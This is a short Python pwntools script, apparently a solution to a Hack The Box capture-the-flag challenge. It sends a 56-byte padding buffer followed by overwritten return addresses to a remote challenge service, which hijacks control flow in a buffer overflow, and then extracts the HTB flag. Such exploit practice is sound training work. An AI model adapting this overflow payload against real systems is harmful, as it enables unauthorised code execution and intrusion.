from pwn import *
import re

host = '94.237.59.63'
port = 37376

door = b'069\n'

offset = 56
payload = b"A" * offset
init = b'\x00\x10\x40\x00\x00\x00\x00\x00'
escape = b'\x55\x12\x40\x00\x00\x00\x00\x00'

flag_pattern = r'HTB\{.*?\}'


data = payload + init + escape + b"\n"

with remote(host, port) as connection:
    connection.recvuntil(b'>>')
    connection.send(door)
    connection.recvuntil(b'>>')
    connection.send(data)
    flag_data = connection.recvuntil(b'}').decode()
    flag= re.findall(flag_pattern, flag_data)[0]
    print(flag)
    

